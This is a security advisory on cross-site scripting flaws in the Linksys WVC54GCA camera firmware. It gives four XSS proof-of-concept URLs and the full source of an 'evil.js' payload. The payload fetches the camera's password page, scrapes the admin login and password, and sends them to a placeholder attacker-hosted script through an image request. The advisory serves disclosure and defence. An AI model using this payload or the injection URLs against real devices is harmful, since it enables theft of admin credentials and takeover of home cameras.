source: http://www.securityfocus.com/bid/34714/info

Linksys WVC54GCA Wireless-G Internet Home Monitoring Camera is prone to multiple cross-site scripting vulnerabilities because the software fails to sufficiently sanitize user-supplied data.

An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.

Linksys WVC54GCA Wireless-G Internet Home Monitoring Camera firmware 1.00R22 and 1.00R24 are affected; other versions may also be vulnerable. 

http://www.example.com/adm/file.cgi?todo=xss&this_file=%3cscript%3ealert(1)%3c/script%3e
http://www.example.com/adm/file.cgi?next_file=%3Cscript%3Ealert(1)%3C/script%3E
http://www.example.com/img/main.cgi?next_file=%3Cimg%20src%3dx%20onerror%3dalert(1)%3E
http://www.example.com/main.cgi?next_file=%3Cimg%20src%3dx%20onerror%3dalert(1)%3E


// evil.js : malicious JS file, typically located on attacker&#039;s site
// payload description: steals Linksys WVC54GCA admin password via XSS
// tested on FF3 and IE7
// based on code from developer.apple.com
function loadXMLDoc(url) {
	req = false;
    	// branch for native XMLHttpRequest object
    	if(window.XMLHttpRequest && !(window.ActiveXObject)) {
    		try {	
			req = new XMLHttpRequest();
        	} 
		catch(e) {
			req = false;
        	}
    	} 
    	// branch for IE/Windows ActiveX version	
	else if(window.ActiveXObject) {
       		try { 
        		req = new ActiveXObject("Msxml2.XMLHTTP");
      		} 
		catch(e)  {
        		try {
          			req = new ActiveXObject("Microsoft.XMLHTTP");
        		} 
			catch(e) {
          			req = false;
        		}
		}
    	}
	if(req) {
		req.onreadystatechange = processReqChange;
		req.open("GET", url, true);
		req.send("");
	}
}
// end of loadXMLDoc(url)

function processReqChange() {
   	// only if req shows "loaded"
    	if (req.readyState == 4) {
        	// only if "OK"
        	if (req.status == 200) { 
			var bits=req.responseText.split(/\"/);	
			var gems="";
			// dirty credentials-scraping code
			for (i=0;i<bits.length;++i) { 
                                if(bits[i]=="adm" && bits[i+1]==" value=") {      
                               		gems+="login="; 
					gems+=bits[i+2];
                                }
                                if(bits[i]=="admpw" && bits[i+1]==" value=") {      
                                       	gems+=&#039;&password=&#039;; 
					gems+=bits[i+2];    
                                }
			}
			alert(gems); // this line is for demo purposes only and would be removed in a real attack
			c=new Image();
			c.src=&#039;http://www.example.com/x.php?&#039;+gems; // URL should point to data-theft script on attacker&#039;s site
        	} 
    	}
}

var url="/adm/file.cgi?next_file=pass_wd.htm";
loadXMLDoc(url);